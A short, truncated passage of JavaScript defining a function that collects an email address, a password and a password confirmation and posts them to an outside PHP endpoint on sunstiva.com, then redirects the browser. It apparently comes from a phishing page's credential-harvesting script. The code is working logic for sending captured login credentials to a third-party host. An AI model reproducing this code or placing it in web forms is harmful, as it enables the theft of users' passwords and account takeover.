  ...
  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://sunstiva.com/gymp/feld/feedback20.php", o).then(function(t) {200 === t.status && redirect(t.data)}).catch(function(t) {
